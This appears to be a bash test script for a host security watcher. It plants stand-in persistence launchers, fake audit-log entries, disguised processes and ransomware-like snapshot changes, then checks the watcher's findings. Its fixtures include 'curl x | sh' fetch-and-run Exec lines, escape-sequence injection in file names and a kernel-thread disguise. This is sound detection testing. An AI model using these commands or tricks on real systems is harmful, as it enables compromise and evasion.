#!/usr/bin/bash
# The security watcher against what an account can plant, for 20-tests.sh: text it wrote (here a launcher's
# file name holding a newline, an escape sequence and markup) reaches the history, the unread list, the
# Events page's file, a notification and `--show` only as plain text; a launcher linked to a file that never
# ends cannot keep a run waiting; and every finding carries its facts. Runs as root, as the watcher does,
# against a stand-in /etc/passwd, /var/home, state and logs, with a stand-in for the notification.

set -euo pipefail

WATCH="${1:-/usr/libexec/amethystora-security-watch}"
TEXT=/usr/libexec/amethystora-security-text
T="$(realpath "$(mktemp -d)")"
trap 'rm -rf "${T}"' EXIT
chmod 0755 "${T}"
fail() { echo "test-security-watch: $*" >&2; exit 1; }
ESC=$'\e'

# --- The text filter on its own -------------------------------------------------------------------------

out="$("${TEXT}" "a${ESC}]0;title${ESC}\\b"$'\n'"c"$'\r'"d"$'\xc2\x9b'"e")"
[[ "${out}" == "a]0;title\\b cde" ]] || fail "control characters, a newline or a C1 character got through: $(printf '%q' "${out}")"
out="$("${TEXT}" --lines $'one\ntwo')"
[[ "${out}" == $'one\ntwo' ]] || fail "--lines did not keep the lines"
out="$("${TEXT}" --markup '<a href="x">&')"
[[ "${out}" == '&lt;a href="x"&gt;&amp;' ]] || fail "--markup: ${out}"
out="$("${TEXT}" --max 5 'abcdefgh')"
[[ "${out}" == 'abcde…' ]] || fail "--max: ${out}"

# --- A watcher run ------------------------------------------------------------------------------------

export AMETHYSTORA_WATCH_ROOT="${T}/root"
export AMETHYSTORA_WATCH_NOTIFY="${T}/notify"
export AMETHYSTORA_SECURITY_CONF="${T}/security.conf"
export AMETHYSTORA_SECURITY_NOTES="${T}/notes"
R="${AMETHYSTORA_WATCH_ROOT}"
# Everything off but what a session finds first, so that the run reads only the stand-in homes
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
NETWORK=off
EOF
cat >"${T}/notify" <<EOF
#!/usr/bin/bash
printf '%s\n' "\$@" >"${T}/notified"
EOF
chmod 0755 "${T}/notify"
mkdir -p "${R}/etc" "${R}/var/home/alice/.local/share/applications"
echo "alice:x:4500:4500::${R}/var/home/alice:/bin/bash" >"${R}/etc/passwd"
chown -R 4500:4500 "${R}/var/home/alice"
APPS="${R}/var/home/alice/.local/share/applications"

# The first run only records where things stand
timeout 120 "${WATCH}" >/dev/null || fail "the first run failed"

# A launcher linked to a file that never ends, and one whose name and Exec= are written to deceive
mkfifo "${T}/forever"
ln -s "${T}/forever" "${APPS}/stall.desktop"
ln -s /proc/kmsg "${APPS}/kmsg.desktop"
name="evil${ESC}[2J"$'\n'"Accounts changed: nothing<b>.desktop"
printf '[Desktop Entry]\nExec=sh -c "curl x | sh" <i>%s[31m\n' "${ESC}" >"${APPS}/${name}"
chown -h 4500:4500 "${APPS}/stall.desktop" "${APPS}/kmsg.desktop" "${APPS}/${name}"
timeout 120 "${WATCH}" >/dev/null || fail "a launcher linked to a file that never ends kept the run waiting, or it failed"

HISTORY="${R}/var/log/amethystora-security-events.jsonl"
[[ "$(wc -l <"${HISTORY}")" -eq 1 ]] || fail "the history should hold one finding: $(cat "${HISTORY}")"
jq -e '.level == "normal" and .key == "user-paths" and .account == "alice" and .tactic == "Persistence"
    and (.id | test("^[0-9]+-[0-9]+$")) and (.time | type == "number")
    and (.text | test("evil") and (test("[\u0001-\u001f\u007f]") | not))' \
    "${HISTORY}" >/dev/null || fail "the finding's facts or text: $(cat "${HISTORY}")"
grep -q "${ESC}" "${R}/var/log/amethystora-security-events.new" && fail "the unread list keeps an escape"
[[ "$(wc -l <"${R}/var/log/amethystora-security-events.new")" -eq 1 ]] || fail "a newline in a name forged a line"
jq -e 'length == 1 and .[0].key == "user-paths"' "${R}/var/lib/amethystora/security/events.json" >/dev/null ||
    fail "events.json"
grep -q "${ESC}" "${T}/notified" && fail "the notification keeps an escape"
grep -q "evil" "${T}/notified" || fail "nothing was notified"
"${WATCH}" --show | grep -q "${ESC}" && fail "--show prints an escape"
jq -e '.timings | has("USER_PATHS")' "${R}/var/lib/amethystora/security/status.json" >/dev/null ||
    fail "status.json has no timings"
[[ "$("${WATCH}" --keys)" == *"|input-capture|"* ]] || fail "--keys"

# A launcher whose first Exec= is one a container export writes, and whose last, the one GLib runs, is not
printf '[Desktop Entry]\nExec=distrobox-enter -n box -- tool\nExec=sh -c "curl y | sh"\n' >"${APPS}/decoy.desktop"
chown 4500:4500 "${APPS}/decoy.desktop"
timeout 120 "${WATCH}" >/dev/null || fail "the run after the decoy launcher failed"
grep -q "decoy.desktop" "${HISTORY}" || fail "a launcher that opens with a container's Exec= was not said"

# --- What only an account can see -----------------------------------------------------------------------

# A reader runs as the account, and the watcher says what is new in what it printed: to that account alone,
# not what came with something new, and not what the owner allowed. Its first run only records.
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
AUDIT_LOG=off
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
APP_PERMISSIONS=on
EOF
export AMETHYSTORA_WATCH_READER="${T}/reader" AMETHYSTORA_WATCH_ACCOUNTS=4500
cat >"${T}/reader" <<EOF
#!/usr/bin/bash
[[ "\$(id -u)" == 4500 && "\${HOME}" == "${R}/var/home/alice" && "\$1" == app-permissions ]] || exit 1
cat "${T}/read"
EOF
chmod 0755 "${T}/reader"
printf '%s\n' '{"id":"org.a.App","level":"quiet","text":"org.a.App was installed"}' \
    '{"id":"org.a.App session-bus","within":"org.a.App","level":"normal","text":"org.a.App can talk to the session"}' >"${T}/read"
chmod 0644 "${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's first run failed"
[[ -e "${T}/notified" ]] && fail "a reader's first run said something"
grep -qx "org.a.App session-bus" "${R}/var/lib/amethystora/security/accounts/4500/app-permissions.seen" ||
    fail "the reader's first run was not kept"
printf '%s\n' '{"id":"org.b.New","level":"quiet","text":"org.b.New was installed"}' \
    '{"id":"org.b.New session-bus","within":"org.b.New","level":"normal","text":"org.b.New can talk to the session"}' \
    '{"id":"org.a.App flatpak","within":"org.a.App","level":"normal","allow":"org.a.App flatpak","text":"org.a.App can now run programs\u001b[2J outside"}' \
    >>"${T}/read"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's second run failed"
jq -se 'map(select(.key == "app-permissions")) | length == 3
    and any(.[]; .text | test("run programs") and (test("\u001b") | not)) and all(.[]; .account == "alice" and .tell == "alice")
    and ([.[] | select(.level != "quiet") | .allow] == ["org.a.App flatpak"])' "${HISTORY}" >/dev/null ||
    fail "what the reader found: $(grep app-permissions "${HISTORY}")"
grep -qx -- "--user" "${T}/notified" && grep -qx alice "${T}/notified" || fail "a finding about alice's apps was not said to alice alone"
grep -qx -- "--admins" "${T}/notified" && fail "a finding about alice's apps was said to the administrators"
# What the owner allowed is recorded, not said
mkdir -p "${R}/etc/amethystora/allow.d"
echo 'org.c.* *' >"${R}/etc/amethystora/allow.d/app-permissions"
echo '{"id":"org.a.App org.c","within":"org.a.App","level":"normal","allow":"org.c.Other systemd","text":"allowed"}' >>"${T}/read"
rm -f "${T}/notified"
timeout 120 "${WATCH}" >/dev/null || fail "the reader's third run failed"
[[ -e "${T}/notified" ]] && fail "what the owner allowed was said"
jq -se 'any(.[]; .text == "allowed" and .level == "quiet")' "${HISTORY}" >/dev/null || fail "what the owner allowed was not recorded"

# --- What the audit log holds, from a stand-in log in the kernel's raw form ---------------------------------

unset AMETHYSTORA_WATCH_READER AMETHYSTORA_WATCH_ACCOUNTS
export AMETHYSTORA_WATCH_AUDIT="${T}/audit.log"
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF'
HARDENING=off
JOURNAL=off
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
IDENTITY=off
PRIVILEGE=off
PERSISTENCE=off
MODULES=off
INPUT_CAPTURE=off
USER_PROGRAMS=off
SELINUX_DENIALS=on
EOF
# Each audit record after the run before, so that it is new to this one. ausearch gives an event only once
# one more than two seconds newer has come, as on a machine one always does: close() writes that one.
# The records of each step are written that many seconds after the test began (STEP), in order.
BEGAN="$(date +%s)"
STEP=1
close() { printf 'type=USER_START msg=audit(%s.100:%s): pid=1 uid=0 auid=0 ses=1 msg=x\n' "$((BEGAN + STEP + 20))" "$1"; }
avc() {
    printf 'type=AVC msg=audit(%s.100:%s): avc:  denied  { %s } for  pid=4242 comm=%s name="shadow" dev="dm-0" ino=7 scontext=system_u:system_r:%s:s0 tcontext=system_u:object_r:%s:s0 tclass=file permissive=%s\n' \
        "$((BEGAN + STEP))" "$1" "$2" "$3" "$4" "$5" "$6"
}
{
    avc 101 "read open" '"evil"' httpd_t shadow_t 0
    avc 102 "read open" '"evil"' httpd_t shadow_t 0
    avc 103 "write" 6576696C1B5B324A unconfined_service_t etc_t 1
    close 199
} >"${AMETHYSTORA_WATCH_AUDIT}"
chmod 0600 "${AMETHYSTORA_WATCH_AUDIT}"
sleep 2
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with SELinux denials failed"
SELINUX_FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "selinux-denials")')"
jq -se 'length == 2 and (.[0].level == "normal" and .[0].allow == "httpd_t shadow_t file read,open"
    and (.[0].text | test("SELinux kept evil \\(httpd_t\\) from read, open on a file of type shadow_t")))
    and (.[1].level == "quiet" and (.[1].text | test("permissive")))' <<<"${SELINUX_FOUND}" >/dev/null ||
    fail "SELinux's denials: ${SELINUX_FOUND}"
# The same denial again is not news
STEP=30
{ avc 104 "read open" '"evil"' httpd_t shadow_t 0; close 299; } >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with SELinux denials failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q selinux-denials && fail "the same denial was said twice"

# A program run from a writable folder, as the kernel records it: said once, by what is in it, and one gone,
# with a name the kernel wrote in hex, by its name made plain
echo "EXEC_WATCH=on" >>"${AMETHYSTORA_SECURITY_CONF}"
cp /usr/bin/true /var/tmp/watch-exec
execution() {
    # ausearch reads a SYSCALL record only with all of a real one's fields, a0 to a3 included
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid=10 pid=11 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=3 comm="x" exe=%s subj=unconfined_u:unconfined_r:unconfined_t:s0 key="exec-watch"\n' \
        "$((BEGAN + STEP))" "$1" "$2"
    printf 'type=EXECVE msg=audit(%s.100:%s): argc=2 a0=%s a1="--now"\n' "$((BEGAN + STEP))" "$1" "$2"
    printf 'type=CWD msg=audit(%s.100:%s): cwd="/root"\n' "$((BEGAN + STEP))" "$1"
    printf 'type=PATH msg=audit(%s.100:%s): item=0 name=%s inode=1 dev=00:01 nametype=NORMAL\n' "$((BEGAN + STEP))" "$1" "$2"
}
STEP=60
{
    execution 401 '"/var/tmp/watch-exec"'
    execution 402 2F7661722F746D702F6120621B5B324A
    execution 403 '"/var/tmp/watch-exec"'
    close 499
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with programs run from writable folders failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "exec-watch")')"
jq -se 'length == 2 and any(.[]; .text == "A program ran for the first time from where downloads and temporary files land: /var/tmp/watch-exec, as 4500"
        and .allow == "/var/tmp/watch-exec" and .tactic == "Execution")
    and any(.[]; .text | test("/var/tmp/a b\\?\\[2J"))' <<<"${FOUND}" >/dev/null || fail "programs run from writable folders: ${FOUND}"
rm -f /var/tmp/watch-exec

# An agent run with its checks off: said with no terminal, once for however many runs, recorded at one, and
# not at all without a flag
echo "AGENT_CLIS=on" >>"${AMETHYSTORA_SECURITY_CONF}"
agent_run() {
    local serial="$1" tty="$2" index=0 arg
    shift 2
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid=1 pid=12 auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=%s ses=3 comm="claude" exe="/var/home/alice/.local/share/claude/versions/2.1.0" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="agent-clis"\n' \
        "$((BEGAN + STEP))" "${serial}" "${tty}"
    printf 'type=EXECVE msg=audit(%s.100:%s): argc=%s' "$((BEGAN + STEP))" "${serial}" "$#"
    for arg in "$@"; do
        printf ' a%s="%s"' "${index}" "${arg}"
        index=$((index + 1))
    done
    echo
}
STEP=90
{
    agent_run 501 "(none)" claude --dangerously-skip-permissions -p hi
    agent_run 502 "(none)" claude --dangerously-skip-permissions
    agent_run 503 pts0 claude --permission-mode=bypassPermissions
    agent_run 504 "(none)" claude --help
    close 599
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with agents failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "agent-clis")')"
PARENT="$(readlink /proc/1/exe)"
jq -se --arg parent "${PARENT}" 'length == 2
    and any(.[]; .level == "normal" and .allow == $parent and .text == "An AI agent ran with its own checks turned off: claude --dangerously-skip-permissions, started by \($parent) with no terminal (2 times)")
    and any(.[]; .level == "quiet" and (.text | test("claude --permission-mode bypassPermissions, started by .* at a terminal$")))' \
    <<<"${FOUND}" >/dev/null || fail "agents run with their checks off: ${FOUND}"

# Reading where secrets are kept: a program not on a file's list is said, one sweeping two kinds is critical,
# ssh reading its keys is nothing; and any read of the decoy is critical, but the backup's
printf 'CREDENTIALS=on\nDECOY=on\n' >>"${AMETHYSTORA_SECURITY_CONF}"
opened() {
    printf 'type=SYSCALL msg=audit(%s.100:%s): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55d1 a2=0 a3=0 items=1 ppid=1 pid=%s auid=4500 uid=4500 gid=4500 euid=4500 suid=4500 fsuid=4500 egid=4500 sgid=4500 fsgid=4500 tty=(none) ses=3 comm="x" exe="%s" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="%s"\n' \
        "$((BEGAN + STEP))" "$1" "$2" "$3" "$5"
    printf 'type=CWD msg=audit(%s.100:%s): cwd="/var/home/alice"\n' "$((BEGAN + STEP))" "$1"
    printf 'type=PATH msg=audit(%s.100:%s): item=0 name="%s" inode=1 dev=00:01 nametype=NORMAL\n' "$((BEGAN + STEP))" "$1" "$4"
}
STEP=120
{
    opened 601 21 /usr/bin/python3.14 /var/home/alice/.ssh/id_ed25519 credentials
    opened 602 21 /usr/bin/python3.14 .aws/credentials credentials
    opened 603 22 /usr/bin/ssh /var/home/alice/.ssh/id_ed25519 credentials
    opened 604 23 /usr/bin/cat /var/home/alice/.ssh/id_backup decoy
    opened 605 24 /usr/bin/restic /var/home/alice/.ssh/id_backup decoy
    close 699
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with secrets read failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "credentials" or .key == "decoy")')"
jq -se 'length == 5
    and any(.[]; .key == "credentials" and .level == "normal" and .text == "/usr/bin/python3.14 read /var/home/alice/.ssh/id_ed25519 (SSH keys), as 4500")
    and any(.[]; .key == "credentials" and .level == "normal" and (.text | test("read /var/home/alice/.aws/credentials .AWS keys.")))
    and any(.[]; .key == "credentials" and .level == "critical" and (.text | test("process 21, as 4500. read (SSH keys, AWS keys|AWS keys, SSH keys)$")))
    and any(.[]; .key == "decoy" and .level == "critical" and (.text | startswith("/usr/bin/cat read the decoy key")))
    and any(.[]; .key == "decoy" and .level == "quiet" and (.text | startswith("/usr/bin/restic")))
    and all(.[]; (.text | test("/usr/bin/ssh ")) | not)' <<<"${FOUND}" >/dev/null || fail "secrets read: ${FOUND}"

# Steps of one attack: a program run from the downloads and a secret read, for one account, are a chain,
# said once; what the owner allowed builds none
echo "CHAINS=on" >>"${AMETHYSTORA_SECURITY_CONF}"
# Another program than the one run before, which was said already: a byte more makes it one
cp /usr/bin/true /var/tmp/watch-chain
printf x >>/var/tmp/watch-chain
STEP=150
{
    execution 701 '"/var/tmp/watch-chain"'
    opened 702 31 /usr/bin/perl /var/home/alice/.npmrc credentials
    close 799
} >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run with a chain failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "chains")')"
jq -se 'length == 1 and .[0].level == "normal" and .[0].account == "4500"
    and (.[0].text | test("Credential Access .credentials.") and test("Execution .exec-watch."))' <<<"${FOUND}" >/dev/null ||
    fail "a chain of steps: ${FOUND}"
STEP=180
{ opened 801 32 /usr/bin/perl /var/home/alice/.pypirc credentials; close 899; } >>"${AMETHYSTORA_WATCH_AUDIT}"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the second run with a chain failed"
tail -n +"$((before + 1))" "${HISTORY}" | grep -q '"key":"chains"' && fail "the same chain was said twice"
rm -f /var/tmp/watch-chain

# --- Network protection's alerts --------------------------------------------------------------------------

# A hunting rule's alert is recorded and never said, whatever its severity; another severe one is said
mkdir -p "${R}/var/log/suricata"
printf '%s\n' \
    '{"timestamp":"2026-10-10T10:00:00.000000+0000","event_type":"alert","src_ip":"10.0.0.2","dest_ip":"203.0.113.9","dest_port":443,"proto":"TCP","alert":{"action":"allowed","signature_id":2030000,"signature":"ET HUNTING Suspicious TLS SNI","category":"x","severity":1}}' \
    '{"timestamp":"2026-10-10T10:00:01.000000+0000","event_type":"alert","src_ip":"10.0.0.2","dest_ip":"203.0.113.10","dest_port":443,"proto":"TCP","alert":{"action":"allowed","signature_id":9000001,"signature":"Feodo Tracker: known command server","category":"x","severity":1}}' \
    >"${R}/var/log/suricata/eve.json"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading network protection's alerts failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "network")')"
jq -se 'length == 2 and any(.[]; (.text | test("ET HUNTING")) and .level == "quiet")
    and any(.[]; (.text | test("Feodo Tracker")) and .level == "normal")' <<<"${FOUND}" >/dev/null ||
    fail "network protection's alerts: ${FOUND}"
rm -f "${R}/var/log/suricata/eve.json"

# --- What runs ------------------------------------------------------------------------------------------------

unset AMETHYSTORA_WATCH_AUDIT
sed -i 's/^SELINUX_DENIALS=on$/AUDIT_LOG=off\nPROCESSES=on/' "${AMETHYSTORA_SECURITY_CONF}"
# The first run with it on only records what runs already
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading processes failed"
P="$(mktemp -d /var/tmp/watch-XXXX)"
cp /usr/bin/sleep "${P}/dropped"
cp /usr/bin/sleep "${P}/gone"
mkdir -p "${P}/allowed"
# A program is remembered by what it is: a byte more makes it another one
cp /usr/bin/sleep "${P}/allowed/sleep"
printf x >>"${P}/allowed/sleep"
printf '#!/usr/bin/bash\nsleep 300\n' >/var/tmp/claude
chmod 0755 /var/tmp/claude
PIDS=()
"${P}/dropped" 300 &
PIDS+=($!)
"${P}/gone" 301 &
PIDS+=($!)
rm "${P}/gone"
"${P}/allowed/sleep" 302 &
PIDS+=($!)
# A disguised thread, a network tool an npm script started, and an agent run with its checks off
bash -c 'exec -a "[kworker/0:9]" /usr/bin/cat' < <(sleep 300) >/dev/null &
PIDS+=($!)
npm_lifecycle_event=postinstall bash -c 'exec -a curl /usr/bin/sleep 303' &
PIDS+=($!)
/var/tmp/claude --dangerously-skip-permissions </dev/null >/dev/null 2>&1 &
PIDS+=($!)
mkdir -p "${R}/etc/amethystora/allow.d"
echo "${P}/allowed/*" >"${R}/etc/amethystora/allow.d/processes"
sleep 1
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading processes failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "processes")')"
kill "${PIDS[@]}" 2>/dev/null || true
for want in "runs from a folder where downloads and temporary files land: ${P}/dropped" \
    "runs from a file that was deleted since: ${P}/gone" 'names itself like a kernel thread, [kworker/0:9]' \
    "An npm package's postinstall script started curl" \
    'An AI agent runs with its own checks turned off: claude --dangerously-skip-permissions (/var/tmp/claude), started without a terminal'; do
    grep -qF -- "${want}" <<<"${FOUND}" || fail "what runs: \"${want}\" was not found in ${FOUND}"
done
jq -se 'any(.[]; (.text | test("kernel thread")) and .level == "critical" and .tactic == "Defense Evasion")
    and any(.[]; (.text | test("/allowed/sleep")) and .level == "quiet")
    and any(.[]; (.text | test("AI agent")) and .allow == "/var/tmp/claude")
    and all(.[]; .account == "root")' <<<"${FOUND}" >/dev/null || fail "what runs, its levels: ${FOUND}"
# Each is said once
before="$(wc -l <"${HISTORY}")"
cp /usr/bin/sleep "${P}/dropped"
"${P}/dropped" 304 &
PIDS=($!)
timeout 120 "${WATCH}" >/dev/null || fail "the second run reading processes failed"
kill "${PIDS[@]}" 2>/dev/null || true
tail -n +"$((before + 1))" "${HISTORY}" | grep -q '"key":"processes"' && fail "the same program was said twice"
rm -rf "${P}" /var/tmp/claude

# --- Programs in the kernel's BPF, from a stand-in bpftool ------------------------------------------------

sed -i 's/^PROCESSES=on$/BPF_PROGRAMS=on/' "${AMETHYSTORA_SECURITY_CONF}"
export AMETHYSTORA_WATCH_BPFTOOL="${T}/bpftool"
printf '#!/usr/bin/bash\ncat "%s/bpf.json"\n' "${T}" >"${T}/bpftool"
chmod 0755 "${T}/bpftool"
echo '[{"id":1,"type":"cgroup_device","tag":"aa11","pids":[{"pid":1,"comm":"systemd"}]}]' >"${T}/bpf.json"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading BPF failed"
sleep 600 &
HOLDER=$!
cp /usr/bin/sleep /var/tmp/loader
/var/tmp/loader 600 &
LOADER=$!
jq -nc --argjson holder "${HOLDER}" --argjson loader "${LOADER}" '[
    {id: 1, type: "cgroup_device", tag: "aa11", pids: [{pid: 1, comm: "systemd"}]},
    {id: 2, type: "cgroup_skb", tag: "bb22", name: "sd_fw_egress", pids: [{pid: $holder, comm: "sleep"}]},
    {id: 3, type: "kprobe", tag: "cc33", name: "hide\u001b[2J"},
    {id: 4, type: "tracepoint", tag: "dd44", name: "spy", pids: [{pid: $loader, comm: "loader"}]}]' >"${T}/bpf.json"
before="$(wc -l <"${HISTORY}")"
timeout 120 "${WATCH}" >/dev/null || fail "the run reading BPF failed"
kill "${HOLDER}" "${LOADER}" 2>/dev/null || true
rm -f /var/tmp/loader
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "bpf-programs")')"
jq -se 'length == 3
    and any(.[]; (.text | test("sd_fw_egress .cgroup_skb, tag bb22., by /usr/bin/sleep")) and .level == "quiet")
    and any(.[]; (.text | test("hide..2J .kprobe, tag cc33., by a process that is gone")) and .level == "normal")
    and any(.[]; (.text | test("spy .tracepoint, tag dd44., by /var/tmp/loader")) and .level == "normal"
        and .allow == "spy /var/tmp/loader")' <<<"${FOUND}" >/dev/null || fail "BPF programs: ${FOUND}"

# --- Ransomware behaviour, from stand-in snapshots and a stand-in btrfs -------------------------------------

# btrfs's dump as btrfs-progs 7.1 writes it (seen on a real pair of snapshots): alice's documents rewritten
# with random bytes, bob's few changed, mallory's deleted, and a cache's changes, which do not count
sed -i 's/^BPF_PROGRAMS=on$/SNAPSHOT_WATCH=on/' "${AMETHYSTORA_SECURITY_CONF}"
export AMETHYSTORA_WATCH_BTRFS="${T}/btrfs"
printf '#!/usr/bin/bash\n[[ "$1" == receive ]] && cat "%s/dump"\nexit 0\n' "${T}" >"${T}/btrfs"
chmod 0755 "${T}/btrfs"
S="${R}/var/home/.snapshots"
mkdir -p "${S}/2026-10-10_1200/alice/Docs"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading snapshots failed"
mkdir -p "${S}/2026-10-10_1300/alice/Docs"
{
    echo 'snapshot        ./2026-10-10_1300               uuid=1 transid=10 parent_uuid=2 parent_transid=9'
    for i in $(seq 1 320); do
        head -c 5000 < <(yes "plain text line ${i}") >"${S}/2026-10-10_1200/alice/Docs/note ${i}.txt"
        head -c 5000 /dev/urandom >"${S}/2026-10-10_1300/alice/Docs/note ${i}.txt"
        echo "update_extent   ./2026-10-10_1300/alice/Docs/note\\ ${i}.txt offset=0 len=5000"
    done
    for i in $(seq 1 20); do echo "update_extent   ./2026-10-10_1300/bob/b${i} offset=0 len=1"; done
    for i in $(seq 1 400); do echo "update_extent   ./2026-10-10_1300/bob/.cache/c${i} offset=0 len=1"; done
    for i in $(seq 1 350); do echo "unlink          ./2026-10-10_1300/mallory/Pictures/p${i}"; done
    echo 'mkfile          ./2026-10-10_1300/o269-10-0'
    echo 'rename          ./2026-10-10_1300/o269-10-0     dest=./2026-10-10_1300/alice/Docs/new\ file'
} >"${T}/dump"
before="$(wc -l <"${HISTORY}")"
timeout 300 "${WATCH}" >/dev/null || fail "the run reading snapshots failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "snapshot-watch")')"
jq -se 'length == 2
    and any(.[]; .level == "critical" and .account == "alice" and .at == "2026-10-10_1200" and .tactic == "Impact"
        and (.text | startswith("320 files in alice'"'"'s home folder changed within the hour before 2026-10-10_1300, and 100 of the 100 looked at went from readable to random")))
    and any(.[]; .level == "critical" and .account == "mallory" and (.text | startswith("350 files were deleted from mallory")))' \
    <<<"${FOUND}" >/dev/null || fail "ransomware behaviour: ${FOUND}"

echo "test-security-watch: what an account plants is only ever read"
